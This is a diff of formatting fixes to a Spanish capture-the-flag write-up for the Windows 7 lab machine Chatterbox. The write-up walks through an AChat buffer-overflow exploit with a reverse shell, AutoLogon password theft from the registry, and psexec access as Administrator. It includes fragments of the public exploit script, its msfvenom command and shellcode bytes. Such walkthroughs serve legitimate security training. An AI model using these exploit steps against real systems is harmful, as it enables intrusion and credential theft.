@@ -3,28 +3,28 @@
 ![](../../../../~gitbook/image.md)Publicado: 10 de Junio de 2025
 Autor: José Miguel Romero aKa x3m1Sec
 Dificultad: ⭐ Medium
-###📝 Descripción
+### 📝 Descripción
 Chatterbox es una máquina de dificultad media que ejecuta Windows 7 Professional. El punto de entrada inicial se realiza a través de un Buffer Overflow en el servicio AChat, una aplicación de chat que se ejecuta en los puertos 9255 y 9256. Después de obtener acceso inicial como el usuario Alfred, la escalada de privilegios se logra mediante credenciales hardcodeadas encontradas en el registro de Windows, específicamente en las claves de Winlogon que almacenan contraseñas de AutoLogon en texto plano.La máquina también presenta una configuración incorrecta de permisos ACL que permite al usuario Alfred acceder directamente al archivo root.txt sin necesidad de escalada completa de privilegios, aunque se demuestra la escalada completa a Administrator utilizando las credenciales encontradas.
-###🎯 Objetivos
+### 🎯 Objetivos
 - User Flag: Obtener acceso inicial y capturar la flag del usuario
 - Root Flag: Escalar privilegios a Administrator y obtener la flag final
 - Skills: Buffer Overflow, Windows Registry Enumeration, ACL Misconfiguration
 
-###🔭 Reconocimiento
+### 🔭 Reconocimiento
 
-####Ping para verificación en base a TTL
+#### Ping para verificación en base a TTL
 💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
-####Escaneo de puertos
+#### Escaneo de puertos
 
-####Enumeración de servicios
+#### Enumeración de servicios
 
-####445 TCP - SMB
+#### 445 TCP - SMB
 Aunque la sesión anónima está habilitada, no disponemos de permisos para leer ninguno de los recursos compartidos en la máquina sin credenciales:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
-####9256 TCP (aChat)
+#### 9256 TCP (aChat)
 Búsqueda de exploitsBuscamos exploits públicos para esta herramienta y encontramos una explotación de un Buffer Overflow en dos variantes, un script en python y otro para metasploit![](../../../../~gitbook/image.md)💥 Explotación InicialMe decanto por no usar metasploit para esta máquina, así que después de descargar la versión en python, procedo a generar el shellcode usando en este casi un payload de tipo windows/shell_reverse_tcp:Generación de shellcode![](../../../../~gitbook/image.md)Una vez generado, reemplazo el shellcode y la dirección de la máquina víctima en el script en python quedando de esta forma:A continuación inicio un listener usando rlwrap y netcat y obtengo la reverse shell:![](../../../../~gitbook/image.md)
-####🔐 Enumeración Post-Explotación
+#### 🔐 Enumeración Post-Explotación
 Una vez dentro de la máquina chatterbox obtengo la primera flag en el directorio del usuario Alfred:![](../../../../~gitbook/image.md)Enumeramos como usario Alfred el directorio Administrator de la máquina y vemos que Alfred puede leer incluso el contenido del directorio Desktop. Esto puede ser interesante.Una simple comprobación con la herramienta icacls nos indica que esto es debido a que Alfred tiene permisos full "F" sobre dicho directorio![](../../../../~gitbook/image.md)Una cosa que podemos probar aquí es a asignar permisos a ese directorio para el usuario Alfred usando icacls de la siguiente forma:![](../../../../~gitbook/image.md)Y obtenemos la flag root.txt como usuario Alfred.
-####🎪 Escalada de Privilegios Alternativa
+#### 🎪 Escalada de Privilegios Alternativa
 Aunque hemos obtenido la flag root.txt en este caso por una mala definición de los permisos acls sobre el fichero root.txt, buscaremos escalar privilegios como usuario Administrador. Para ello enumeramos la máquina en busca de un posible vector:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)No descubrimos tampoco aplicaciones instaladas que puedan ser intereasntes, así qeu Transferimos winpeas.bat al host de windows para automatizar un poco esta fase. Para ello iniciamos un servidor web en python y lo decargamos en el directorio de Alfred usando la herramienta certutil:Una vez ejecutado winpeas sobre la máquina chatterbox, obtenemos una contraseña mediante la consulta de la clave de registro:![](../../../../~gitbook/image.md)El script winpeas obtiene esta información consultado la siguiente clave del registro:![](../../../../~gitbook/image.md)Usamos netexec para verificar estas credenciales con el puerto SMB de la máquina:![](../../../../~gitbook/image.md)Verificamos que se está aplicando una mala praxis a la hora de reutilizar contraseñas y esta contraseña también es válida para la cuenta del usuario Administrator:![](../../../../~gitbook/image.md)Además, verificamos que el usuario Administrator tiene acceso de escritura en algunos recursos compartidos, por lo que podemos usar la herramienta impacket-psexec para autenticarnos en el host usando el puerto 445 del servicio SMB y ganar acceso con máximos privilegios.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
 - [🎯 Objetivos](#objetivos)
 - [🔭 Reconocimiento](#reconocimiento)
@@ -167,7 +167,7 @@ buf += b"\x79\x6f\x76\x75\x41\x41"
 ```
 
 ```
-#!/usr/bin/python
+# !/usr/bin/python
 # Author KAhara MAnhara
 # Achat 0.150 beta7 - Buffer Overflow
 # Tested on Windows 7 32bit
@@ -176,7 +176,7 @@ import socket
 import sys, time
 
 # msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
-#Payload size: 512 bytes
+# Payload size: 512 bytes
 
 buf =  b""
 buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
